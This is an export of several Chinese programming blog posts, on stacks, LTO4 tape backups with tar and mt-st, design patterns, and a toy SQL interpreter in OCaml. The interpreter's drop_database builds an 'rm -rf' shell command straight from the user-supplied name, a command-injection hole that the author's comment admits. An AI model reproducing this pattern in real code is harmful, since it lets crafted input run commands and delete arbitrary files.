2，所以我们需要OO，得到最终的队列：1 3 5 4 2。 如何用程序实现这种判断呢？可以先生成一个大小为$n!$的map&lt;队列，bool&gt;，随后根据上面的数学过程穷举结果，并将结果对应的index标记为true然后用查表法得到结果。 当然，如果懒得写生成器，也可以用图灵机完成判断。 123456789101112def fun(data): I,cnt=0,len(data) a,b=[i+1 for i in range(cnt)],[] for i in data: while TRUE: if I==cnt: break b.push(tmp=a.pop_front) I+=1 if tmp==i: break if b.pop!=i: return FALSE return TRUE 这程序模拟了我们上面的手动判断步骤，通过一个队列和一个栈实现。 0x03.实现用C语言实现。在C++中已经有STL中的stack，无需重复实现。 12345678910111213141516/* 数据结构定义 */struct node{ elemtype data; struct node * next;}Node;typedef struct stack{ Node * top; int size;}Stack;/* 操作定义 */bool init(Stack * ptr);bool push(Stack * ptr, elemtype data);bool pop(Stack * ptr, elemtype * data);bool isEmpty(Stack * ptr); 0x04.应用作为一种数据结构，由于栈LIFO的特性，它有很重要的应用。 比如利用短除法进行进制转换的时候，得到的数是从高位开始的，这种时候就适合用栈存储每一步的结果，最后直接出栈，就能得到正序的结果。 再比如括号匹配的检验。左括号一定是要和右括号匹配的，而栈中任一时刻，I操作次数一定是大于等于O操作次数，且最新的I对应最新的O。因此，利用栈，我们就能很容易检验匹配：遇到左括号就入栈，遇到右括号就出栈，如果不匹配返回false，最终返回true即可。 在二叉树的遍历中，我们也用栈进行状态记录。在图的深度优先搜索中，同样用栈记录状态。 栈不仅在数据结构上有很多应用，而且在语言和系统层面也有重要应用。 比如子程序的实现：jmp进入子程序地址之前，应该先把下一条指令的地址push到地址堆栈中，在完成子程序后再push返回主程序。高级语言中的函数调用大抵也是如此。 再比如递归程序的实现。和子程序的调用类似，只是除了储存下一个指令的地址外，也将参数、区域变量等数据存入堆栈中。 这里特别说一下栈在表达式求值的应用。 表达式计算与栈栈可以把中缀表达式转换成后缀表达式，而且利用栈可以很容易地计算后缀表达式的值。 后缀表达式计算 过程很简单，只需要线性时间。对后缀表达式从左往右处理：遇到数字就压栈，遇到运算符就弹出两个数，把结果压栈，直到处理完成只剩一个数，即表达式的运算结果。 中缀表达式转后缀表达式 这需要一个栈，它用于存储操作符。遇到操作数直接输出，遇到符号就入栈。遇到右括号则出栈，直到遇到左括号为止，停止出栈。注意，括号不输出，只弹栈。 在以上条件下，遇到其他符号则弹出栈元素直到发现优先级更低的元素为止。例如，乘除优先级大于加减。 最后，输入结束后，弹栈直到空栈为止。","link":"/2021/09/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E4%BA%8C%EF%BC%89%E6%A0%88/"},{"title":"磁带机入坑小记","text":"世上只有两种人：不备份数据的人和丢失过数据的人 坑是去年入的，机是今年才用的，数据是才备份好的，磁带是热乎的。 机器这个磁带机是我怂恿Ray一块合买的一个戴尔的LTO4磁带机。机器成色看着可以，这东西最大的问题是，这个价格只能买到走SAS连接的版本。所以在这之外还整了个HBA板卡用来把这东西接入主机的PCIE连接。 此外为了实现一些神奇的操作，我俩还整了个PCIE延长插槽，最后转换器插转换器插转换器成功给这玩意插到Ray的老ThinkPad上的Express插槽上了（Think.jpg 安装一个电源，一个sas接口，都插上就完事了。就是得注意启动顺序，磁带机得在电脑之前上电启动。 Windows底下应该能在设备管理器底下找到磁带机的影子，Linux底下看看/dev底下有没有st0, nst0之类的字符设备就行，有就是连上了。 使用只要你不是命令行恐惧症，我一律推荐你直接上Linux用GNU tar作为数据备份工具。Windows上那依托数据备份软件又贵又不好用，不如直接tar。 具体来说，插上磁带机之后，开机启动，系统里的/dev下应该会出现几个新的字符设备，一般有这么几个：st0, nst0之类的。这两个表示一个设备的两个模式，前者在操作完成后会自动倒带，后者则不会自动倒带。 Linux的文件模型将所有设备视为文件进行管理，对于磁带机同理。我们可以像使用其他设备一样使用磁带机，甚至可以直接用重定向符把输出流重定向到磁带机，或者直接用dd把数据写入磁带机设备。 另外由于数据IO作为系统调用，它一旦因为一些奇怪的原因失败有概率会导致系统内核因为死锁挂掉，症状就是其他的文件IO操作都会失败。这种时候只能重启了。 Win上我就不列出了，用过一个L开头的备份软件，又要收费又不好用。Linux上常用的有tar,dd,cpio等。这里只介绍tar和一个磁带机管理工具。另外tar适用单磁带备份，多磁带备份可以自行了解cpio。 tar使用笔记 操作 指令 全盘覆盖从头写入 tar cvf /dev/st0 files/dirs 附加模式写入磁带后部 tar rvf /dev/st0 files/dirs 获取磁带文件列表 tar tvf /dev/st0 &gt; filelist.txt 从磁带恢复文件列表到当前目录 tar xvf /dev/st0 [files/dirs] 这里没列全，tar还有很多用法，比如增量备份，文件恢复 注意，磁带是线性文件系统，在LTFS出现之前的版本（比如LTO4），上面的操作都是很耗时的。 mt-st使用笔记mt-st就是Manage Tape的缩写。它是用来管理磁带机的工具。 操作 指令 mt-st -f /dev/st0 status 获取设备状态 mt-st -f /dev/st0 rewind 倒带 mt-st -f /dev/st0 eject 弹出磁带 mt-st -f /dev/st0 erase 慎用，对磁带有损伤且一般无必要 擦除磁带所有数据 其他玩法刚说过了，磁带机作为一个字符设备，使用方式和其他设备一样，都是把输出数据流重定向到它在/dev下对应的字符设备。那玩法就多了。 首先，数据流可以从远端传过来： 所以磁带机完全可以供多人远程使用，只要本地留个人插拔磁带就彳亍。比如通过ssh将自己的数据传入磁带机，实现远程数据备份。 局域网（比如校园局域网)底下这么玩很爽 另外不光能远程，这个数据流还可以从别的进程传过来。比如可以从你的OBS推流里传过来，可以从你的其他设备传过来（比如摄像头之类的数据采集设备），可以从你的文件下载进程里传过来，还可以从任何数据处理进程里传过来。 反正最后都是花式数据备份嘛。实在闲得没事了还可以写个自助备份系统给别人用用。 结每次掏出来磁带机就有人说这东西随机读写性能不行，傻逼才买。先不说某些人的教养问题，单说抛开需求和使用场景来看设备那不纯耍流氓。 一个纯用来冷备份的设备，作为长期数据储存的设备，真的有人会需要这玩意的随机读写能力？一般使用不都是数据丢失了，插上磁带开始全盘/指定文件列表开始数据恢复嘛。当然你要想的是在这里边下原神打游戏那当我没说。 而且随机读写性能不等于读写性能，这玩意读写是能跑到100+MiBps，也就是800+Mbps的，一般手机下载文件/普通U盘文件传输连续读写都跑不到这速度，而且LTO4的磁带15r/盘，容量800GiB（不开压缩）~1600GiB（开压缩），LTO4磁带机价格也下来了，拿来冷备份的成本和可靠性都远比机械/固态优秀。 不过这玩意小众还是有原因的，最大的原因是这玩意一般不面向普通个人消费者，而是大型数据中心。其次是这玩意价格普遍很贵，特别是磁带机。只有那些相对落后几代的产品才有对比普通存储介质备份方案很明显的性价比优势。 嘛，本来想说下素质问题，想了下没必要，都那样了，还是顺从吧：”啊对对对“。 References GNU tar 1.35: 9.6 Using Multiple Tapes GNU tar 1.35: 9 Tapes and Other Archive Media Linux 磁带机备份完全攻略 - 李济宏（Amadeus） - 博客园 Arch Linux下使用HPE LTO5磁带机（含LTFS）记录 - 知乎 Linux、UNIX下磁带机的管理和使用 （作者：张亚宁） - ITPUB博客 {LTO磁带寿命预估}{怎样计算LTO磁带寿命}{如何让LTO磁带寿命更长}","link":"/2024/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A1%AC%E4%BB%B6/%E7%A3%81%E5%B8%A6%E6%9C%BA%E5%85%A5%E5%9D%91%E5%B0%8F%E8%AE%B0/"},{"title":"关于设计模式","text":"概念先搬一下介绍（ 设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。 设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。 在着手写代码之前，应该先规划好要如何去写，即所谓的成竹在胸。这个过程中，首先需要根据实际需要选择设计模式。 比如，如果我需要写一个计算器，那么我就需要先考虑清楚处理流程。然后，根据流程的复杂度和其他因素，决定是否使用面向对象方法。","link":"/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E5%85%B3%E4%BA%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"title":"用OCaml编写一个SQL解释器","text":"词法&amp;语法分析这两部分使用ocamllex和ocamlyacc就能完成。手写parser和lexer也可以，lexer没啥说的，parser写个递归下降的版本应付一下也够用。下面贴一下代码 说实话，抛开编译原理，只是写语法的话，还是很简单的。先写好token识别器，确定好语言由哪些单词组成，再写好结构化的语法定义，然后丢给lex/yacc/bison之类的东西让它照着编译原理给你codegen出来一个能用的lexer和parser就行。 首先是lexer.mll，这部分感觉基本跟ocaml的语法没啥区别： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778{open Parserexception Lexing_error of string}let whitespace = [' ' '\\t' '\\n' '\\r']+let digit = ['0'-'9']let alpha = ['a'-'z' 'A'-'Z']let alphanum = alpha | digitrule token = parse | whitespace { token lexbuf } (* Ignore whitespace *) | digit+ as num { INT (int_of_string num) } | digit+ &quot;.&quot; digit* as num { FLOAT (float_of_string num) } | (alpha | '_') (alphanum | '_')* as id { match String.lowercase_ascii id with | &quot;create&quot; -&gt; CREATE | &quot;use&quot; -&gt; USE | &quot;show&quot; -&gt; SHOW | &quot;insert&quot; -&gt; INSERT | &quot;into&quot; -&gt; INTO | &quot;select&quot; -&gt; SELECT | &quot;update&quot; -&gt; UPDATE | &quot;set&quot; -&gt; SET | &quot;drop&quot; -&gt; DROP | &quot;delete&quot; -&gt; DELETE | &quot;from&quot; -&gt; FROM | &quot;where&quot; -&gt; WHERE | &quot;exit&quot; -&gt; EXIT | &quot;database&quot; -&gt; DATABASE | &quot;databases&quot; -&gt; DATABASES | &quot;tables&quot; -&gt; TABLES | &quot;table&quot; -&gt; TABLE | &quot;values&quot; -&gt; VALUES | &quot;join&quot; -&gt; JOIN | &quot;on&quot; -&gt; ON | &quot;as&quot; -&gt; AS | &quot;order&quot; -&gt; ORDER | &quot;begin&quot; -&gt; BEGIN | &quot;transaction&quot; -&gt; TRANSACTION | &quot;commit&quot; -&gt; COMMIT | &quot;rollback&quot; -&gt; ROLLBACK | &quot;lock&quot; -&gt; LOCK | &quot;unlock&quot; -&gt; UNLOCK | &quot;view&quot; -&gt; VIEW | &quot;index&quot; -&gt; INDEX | &quot;log&quot; -&gt; LOG | &quot;int&quot; -&gt; INT_TYPE | &quot;string&quot; -&gt; STRING_TYPE | &quot;float&quot; -&gt; FLOAT_TYPE | &quot;bool&quot; -&gt; BOOL_TYPE | &quot;and&quot; -&gt; AND | &quot;or&quot; -&gt; OR | &quot;not&quot; -&gt; NOT | &quot;true&quot; -&gt; BOOL true | &quot;false&quot; -&gt; BOOL false | _ -&gt; IDENTIFIER id } | '&quot;'[^'&quot;']*'&quot;' as str { STRING (String.sub str 1 (String.length str - 2)) } | &quot;*&quot; { STAR } | &quot;,&quot; { COMMA } | &quot;;&quot; { SEMICOLON } | &quot;.&quot; { DOT } | &quot;=&quot; { EQUALS } | &quot;&lt;&quot; { LESS } | &quot;&gt;&quot; { GREATER } | &quot;&lt;=&quot; { LESS_EQUAL } | &quot;&gt;=&quot; { GREATER_EQUAL } | &quot;&lt;&gt;&quot; { NOT_EQUAL } | &quot;+&quot; { PLUS } | &quot;-&quot; { MINUS } | &quot;/&quot; { DIVIDE } | &quot;%&quot; { MOD } | &quot;(&quot; { LPAREN } | &quot;)&quot; { RPAREN } | eof { EOF } | _ as c { raise (Lexing_error (Printf.sprintf &quot;Unexpected character: %c&quot; c)) } 注释用(* 注释 *)分割。标头和标尾是会远原样复制到输出的部分，使用一对大括号包围起来，是可选部分。 然后是正则表达式，使用let定义。 接着是入口点定义，每个入口点都w会是一个接受n+1个参数的ocaml函数。 然后是parser.mly，语法也很简单，就不说了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889%{ open Ast%}%token &lt;string&gt; IDENTIFIER%token &lt;int&gt; INT%token &lt;string&gt; STRING%token &lt;float&gt; FLOAT%token &lt;bool&gt; BOOL%token CREATE USE SHOW INSERT INTO SELECT UPDATE SET DROP DELETE FROM WHERE EXIT%token DATABASES DATABASE TABLES TABLE VALUES JOIN ON AS%token BEGIN TRANSACTION COMMIT ROLLBACK LOCK UNLOCK%token VIEW INDEX LOG%token LPAREN RPAREN COMMA SEMICOLON%token STAR DOT MOD EQUALS LESS GREATER LESS_EQUAL GREATER_EQUAL NOT_EQUAL PLUS MINUS TIMES DIVIDE%token EOF%token INT_TYPE STRING_TYPE FLOAT_TYPE BOOL_TYPE%token AND OR NOT ORDER BY LIMIT%start main%type &lt;Ast.expr&gt; main%% /* Grammar rules and actions */main: | statement SEMICOLON { $1 } | EOF { Exit }statement: | SELECT columns FROM IDENTIFIER opt_where { Select($2, $4, $5) } | CREATE DATABASE IDENTIFIER { CreateDatabase $3 } | USE DATABASE IDENTIFIER { UseDatabase $3 } | CREATE TABLE IDENTIFIER LPAREN table_columns RPAREN { CreateTable($3, $5) } | SHOW TABLES { ShowTables } | SHOW DATABASES { ShowDatabases } | INSERT INTO IDENTIFIER LPAREN columns RPAREN VALUES values { InsertInto($3, $5, $8) } | UPDATE IDENTIFIER SET IDENTIFIER EQUALS value opt_where { Update($2, $4, $6, $7) } | DELETE FROM IDENTIFIER opt_where { Delete($3, $4) } | DROP TABLE IDENTIFIER { DropTable $3 } | DROP DATABASE IDENTIFIER { DropDatabase $3 } | EXIT { Exit }table_columns: | column_def COMMA table_columns { $1 :: $3 } | column_def { [$1] }column_def: | IDENTIFIER data_type { ($1, $2) }columns: | STAR { [] } | IDENTIFIER COMMA columns { $1 :: $3 } | IDENTIFIER { [$1] }values: | LPAREN values_def RPAREN values { $2 :: $4 } | LPAREN values_def RPAREN { [$2] }values_def: | value COMMA values_def { $1 :: $3 } | value { [$1] }value: | INT { IntValue $1 } | STRING { StringValue $1 } | FLOAT { FloatValue $1 } | BOOL { BoolValue $1 }data_type: | INT_TYPE { IntType } | STRING_TYPE { StringType } | FLOAT_TYPE { FloatType } | BOOL_TYPE { BoolType }opt_where: | WHERE condition { Some $2 } | { None }condition: | LPAREN condition RPAREN { $2 } | NOT condition { Not $2 } | condition AND condition { And($1, $3) } | condition OR condition { Or($1, $3) } | IDENTIFIER LESS value { LessThan($1, $3) } | IDENTIFIER GREATER value { GreaterThan($1, $3) } | IDENTIFIER LESS_EQUAL value { LessEqual($1, $3) } | IDENTIFIER GREATER_EQUAL value { GreaterEqual($1, $3) } | IDENTIFIER NOT_EQUAL value { NotEqual($1, $3) } | IDENTIFIER EQUALS value { Equal($1, $3) } 可以看出来我就没支持多少功能，是的因为我懒。 然后是上面提到的ast.ml，里面是各种类型声明，包括存储引擎的函数原型，存储引擎支持的数据类型和表达式的类型等： 12345678910111213141516171819202122232425262728293031type data_type = IntType | StringType | FloatType | BoolTypetype value = | IntValue of int | StringValue of string | FloatValue of float | BoolValue of booltype expr = | CreateDatabase of string | UseDatabase of string | CreateTable of string * (string * data_type) list | ShowTables | ShowDatabases | InsertInto of string * string list * value list list | Select of string list * string * (condition option) | Update of string * string * value * (condition option) | Delete of string * (condition option) | DropTable of string | DropDatabase of string | Exitand condition = | LessThan of string * value | GreaterThan of string * value | LessEqual of string * value | GreaterEqual of string * value | NotEqual of string * value | Equal of string * value | And of condition * condition | Or of condition * condition | Not of condition 这部分也是简单写了下，没打算整太复杂的。 存储引擎语义分析这部分的目的是为了codegen，不过我写的版本比较简单，就不考虑优化了。直接让系统去用存储引擎执行解析好的AST就ok。 每个语句对应的AST对存储引擎的调用方法都是在设计parser的时候设计好的。所以这部分没难度，最后产物的程序一定会按照你写的语法规则对应的结构去一个一个调用存储引擎的接口实现具体的存储功能。 虽然一次丢上来快300行的代码块比较谔谔，但是反正我注释也写的挺清楚的就这样吧（ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269open Ast(* 当前使用的数据库路径 *)let current_db = ref None(* 创建数据库目录 *)let create_database db_name = if Sys.file_exists db_name then Printf.printf &quot;Database %s already exists.\\n&quot; db_name else Unix.mkdir db_name 0o755(* 切换数据库 *)let use_database db_name = if Sys.file_exists db_name &amp;&amp; Sys.is_directory db_name then ( current_db := Some db_name; Printf.printf &quot;Switched to database %s.\\n&quot; db_name) else Printf.printf &quot;Database %s does not exist.\\n&quot; db_name(* 类型名转类型 *)let type_of_name = function | &quot;INT&quot; -&gt; IntType | &quot;STRING&quot; -&gt; StringType | &quot;FLOAT&quot; -&gt; FloatType | &quot;BOOL&quot; -&gt; BoolType | _ -&gt; raise (Invalid_argument &quot;Invalid type&quot;)(* 类型转类型名 *)let name_of_type = function | IntType -&gt; &quot;INT&quot; | StringType -&gt; &quot;STRING&quot; | FloatType -&gt; &quot;FLOAT&quot; | BoolType -&gt; &quot;BOOL&quot;(* 创建表（CSV文件） *)let create_table table_name columns = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then Printf.printf &quot;Table %s already exists.\\n&quot; table_name else let csv = Csv.to_channel (open_out table_path) in let col_names, col_types = List.split columns in Csv.output_record csv col_names; Csv.output_record csv (List.map(fun t -&gt; match t with | IntType -&gt; &quot;INT&quot; | StringType -&gt; &quot;STRING&quot; | FloatType -&gt; &quot;FLOAT&quot; | BoolType -&gt; &quot;BOOL&quot;) col_types); Csv.close_out csv | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 显示当前数据库中的表 *)let show_tables () = match !current_db with | Some db_name -&gt; let files = Sys.readdir db_name in Array.iter (fun f -&gt; if Filename.check_suffix f &quot;.csv&quot; then Printf.printf &quot;%s\\n&quot; (Filename.chop_suffix f &quot;.csv&quot;)) files | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 显示所有数据库 *)let show_databases () = match Sys.readdir &quot;.&quot; with | files -&gt; Array.iter (fun f -&gt; if Sys.is_directory f then Printf.printf &quot;%s\\n&quot; f) files | exception Sys_error msg -&gt; Printf.printf &quot;Error: %s\\n&quot; msg(* 将value转换为字符串 *)let string_of_value = function | IntValue v -&gt; string_of_int v | StringValue v -&gt; v | FloatValue v -&gt; string_of_float v | BoolValue v -&gt; string_of_bool v(* 将字符串转换为value *)let value_of_string = function | &quot;true&quot; -&gt; BoolValue true | &quot;false&quot; -&gt; BoolValue false | s -&gt; match int_of_string_opt s with | Some i -&gt; IntValue i | None -&gt; match float_of_string_opt s with | Some f -&gt; FloatValue f | None -&gt; StringValue s(* 获取字符串对应的数据的类型 *)let type_of_string string = match value_of_string string with | IntValue _ -&gt; IntType | StringValue _ -&gt; StringType | FloatValue _ -&gt; FloatType | BoolValue _ -&gt; BoolType(* 获取数据的类型 *)let type_of_data data = match data with | IntValue _ -&gt; IntType | StringValue _ -&gt; StringType | FloatValue _ -&gt; FloatType | BoolValue _ -&gt; BoolType(* 条件表达式求值，摆烂了 *)let rec eval_cond cond row headers = match cond with | LessThan (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) &lt; v | i, FloatValue v -&gt; float_of_string (List.nth row i) &lt; v | _, _ -&gt; false) | GreaterThan (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) &gt; v | i, FloatValue v -&gt; float_of_string (List.nth row i) &gt; v | _, _ -&gt; false) | LessEqual (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) &lt;= v | i, FloatValue v -&gt; float_of_string (List.nth row i) &lt;= v | _, _ -&gt; false) | GreaterEqual (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) &gt;= v | i, FloatValue v -&gt; float_of_string (List.nth row i) &gt;= v | _, _ -&gt; false) | Equal (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) = v | i, FloatValue v -&gt; float_of_string (List.nth row i) = v | i, StringValue v -&gt; List.nth row i = v | i, BoolValue v -&gt; bool_of_string (List.nth row i) = v) | NotEqual (col, value) -&gt; (match List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers), value with | i, IntValue v -&gt; int_of_string (List.nth row i) &lt;&gt; v | i, FloatValue v -&gt; float_of_string (List.nth row i) &lt;&gt; v | i, StringValue v -&gt; List.nth row i &lt;&gt; v | i, BoolValue v -&gt; bool_of_string (List.nth row i) &lt;&gt; v) | And (cond1, cond2) -&gt; (eval_cond cond1 row headers) &amp;&amp; (eval_cond cond2 row headers) | Or (cond1, cond2) -&gt; (eval_cond cond1 row headers) || (eval_cond cond2 row headers) | Not cond -&gt; not (eval_cond cond row headers)(* 插入数据到表中，校验了类型信息，支持默认填充空值 *)let insert_into table_name columns values = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then let csvIn = Csv.of_channel (open_in table_path) in let csvOut = Csv.to_channel (open_out_gen [Open_append] 0o666 table_path) in let headers = Csv.next csvIn in let types = List.map2 (fun h t -&gt; (h, type_of_name t)) headers (Csv.next csvIn) in List.iteri (fun row value -&gt; Csv.output_record csvOut (List.map (fun header -&gt; match List.assoc_opt header (List.mapi (fun i h -&gt; (h, i)) columns) with | Some index -&gt; ( let _,t = List.nth types index in let tt = type_of_data (List.nth value index) in if t != tt then Printf.printf &quot;Type mismatch for row %d, column %s\\n; Replaced with default value&quot; row header; if t == tt then string_of_value(List.nth value index) else string_of_value (match t with | IntType -&gt; IntValue 0 | FloatType -&gt; FloatValue 0.0 | StringType -&gt; StringValue &quot;&quot; | BoolType -&gt; BoolValue false)) | None -&gt; string_of_value (match List.assoc header types with | IntType -&gt; IntValue 0 | FloatType -&gt; FloatValue 0.0 | StringType -&gt; StringValue &quot;&quot; | BoolType -&gt; BoolValue false)) headers)) values; Csv.close_in csvIn; Csv.close_out csvOut; else Printf.printf &quot;Table %s does not exist.\\n&quot; table_name | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 选择数据（简化实现，没做更细的校验了） *)let select columns table_name condition = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then let csv = Csv.of_channel (open_in table_path) in (* Read header *) let headers = Csv.next csv in let _ = Csv.next csv in let col_indices = List.map (fun col -&gt; List.assoc col (List.mapi (fun i h -&gt; (h, i)) headers)) (match columns with | [] -&gt; headers | _ -&gt; columns) in (* Filter and print rows *) Csv.iter ~f:(fun row -&gt; let selected_values = List.map (fun i -&gt; List.nth row i) col_indices in let row_match_cond = match condition with | None -&gt; true | Some cond -&gt; (eval_cond cond row headers) in if row_match_cond then Printf.printf &quot;%s\\n&quot; (String.concat &quot;, &quot; selected_values) else ()) csv; Csv.close_in csv else Printf.printf &quot;Table %s does not exist.\\n&quot; table_name | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 更新数据 *)let update_table table_name column value condition = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then let data_origin = Csv.load table_path in let headers = List.hd data_origin in let types = List.hd (List.tl data_origin) in let records = List.tl (List.tl data_origin) in let col_index = List.assoc column (List.mapi (fun i h -&gt; (h, i)) headers) in let data_updated = List.mapi (fun _ row -&gt; let row_match_cond = match condition with | None -&gt; true | Some cond -&gt; (eval_cond cond row headers) in if row_match_cond then List.mapi (fun j v -&gt; if j == col_index then string_of_value value else v) row else row) records in let csv = Csv.to_channel (open_out table_path) in Csv.output_record csv headers; Csv.output_record csv types; List.iter (fun row -&gt; Csv.output_record csv row) data_updated; Csv.close_out csv else Printf.printf &quot;Table %s does not exist.\\n&quot; table_name | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 删除数据 *)let delete_from table_name condition = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then let data_origin = Csv.load table_path in let headers = List.hd data_origin in let types = List.hd (List.tl data_origin) in let records = List.tl (List.tl data_origin) in let data_deleted = List.mapi (fun _ row -&gt; if ( match condition with | None -&gt; true | Some cond -&gt; (eval_cond cond row headers) ) then None else Some row) records in let csv = Csv.to_channel (open_out table_path) in Csv.output_record csv headers; Csv.output_record csv types; List.iter (fun row -&gt; match row with | Some r -&gt; Csv.output_record csv r | None -&gt; ()) data_deleted; Csv.close_out csv else Printf.printf &quot;Table %s does not exist.\\n&quot; table_name | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 删除数据库目录，慎用，路径注入利用会删不该删的东西 *)let drop_database db_name = if Sys.file_exists db_name then Sys.command (Printf.sprintf &quot;rm -rf %s&quot; db_name) |&gt; ignore else Printf.printf &quot;Database %s does not exist.\\n&quot; db_name(* 删除表（CSV文件）。同上 *)let drop_table table_name = match !current_db with | Some db_name -&gt; let table_path = Filename.concat db_name (table_name ^ &quot;.csv&quot;) in if Sys.file_exists table_path then Sys.remove table_path else Printf.printf &quot;Table %s does not exist.\\n&quot; table_name | None -&gt; Printf.printf &quot;No database selected.\\n&quot;(* 退出程序 *)let exit_program () = Printf.printf &quot;Exiting...\\n&quot;; exit 0(* 表达式求值，根据表达式类型和表达式的参数列表调用相关的存储引擎实现 *)let eval_expr = function | CreateDatabase name -&gt; create_database name | UseDatabase name -&gt; use_database name | CreateTable (name, cols) -&gt; create_table name cols | ShowDatabases -&gt; show_databases () | ShowTables -&gt; show_tables () | InsertInto (table, cols, vals) -&gt; insert_into table cols vals | Select (cols, table, cond) -&gt; select cols table cond | Update (table, col, value, cond) -&gt; update_table table col value cond | Delete (table, cond) -&gt; delete_from table cond | DropTable name -&gt; drop_table name | DropDatabase name -&gt; drop_database name | Exit -&gt; exit_program () 实现看源码就行，OCaml编程体验确实一绝，一个强大的类型系统+不可变数据类型+纯函数可以解决很多状态变化导致的神必bug。 时间-精力原因，大概就做了上面那么一点。更多什么视图，锁之类的东西本身我也不太熟，也就没做。 分析所以说，从实现上来说没什么难点，比较困难的部分就是工程难度：sql语句太多了，可能的组合也很多。而且sql本身也是上下文相关语法，对于存储引擎的调用也会存在需要记录复杂状态的情况，要把这依托东西完整实现出来需要不少时间。能看出来我现在的实现并不支持那些长的一批的sql语句，它现在基本就是个只能一句一句执行的简单而且不灵活的解释器，不过这些都是努努力就能解决的。 另外就是存储引擎。这部分提供具体功能实现，先不说性能，就实现上的准确无误就较难做到，因为涉及存储这种复杂状态过程，出问题不是概率问题，是频率问题。具体实现要规范数据表文件的结构，而且还要考虑到基于现代fs实现时面对的各种操作的时间复杂度问题来衡量和决定表文件结构的设计，挺麻烦的。 这两部分做完之后肯定不得劲，毕竟能用，但是性能不一定会好，甚至大概率会很差，特别是真实世界的数据库用法很多，当数据量足够大之后，基本就先是技术上追求各种算法，再抽象一层就是追求各种工程领域和实践的结合，在时间/空间/硬件技术之间做各种的trade off了。 优化是一个能一直做下去的玩意，完成上面的毛坯房之后，先给存储引擎的实现换成B+树，再针对前端parse出来的AST结果做各种变换来优化查询过程，还得确保优化前后的无歧义。再说具体的数据处理部分，又能用各种ISA的专有指令进行平台特异的并行化加速。还没完，数据库系统前后端分离降低了开发领域的耦合度，相应的导致了前后端优化的空间限制在自己的区域，那就可以把前端parse出来的AST传给后端，让后端根据指令上下文再做点优化，尽量把IO和处理器性能吃满，把idle压到最小。实现方法有传统的tcs方法，还有现在的典中典各种ai，比如什么根据各种场景搞具体性能分析，再得到优化经验，再丢给ai让ai当AST/后端指令序列优化器，上限也就到这了（？）。 关系数据库理论的内核是关系代数，sql是用户友好版本。所以实在闲得没事，可以再从前端语言的角度设计个新语法，提升提升用户体验，顺便可以搞搞架构上的设计，把那些应用层经常造的东西顺便给它集成进来，优化优化架构和开发效率之类的。 再闲得没事可以改造改造存储引擎，充分利用利用现有的(btr)fs整点新活。数据库的trade off还做不爽了可以再做做分布式数据库，又是更大的依托trade off。 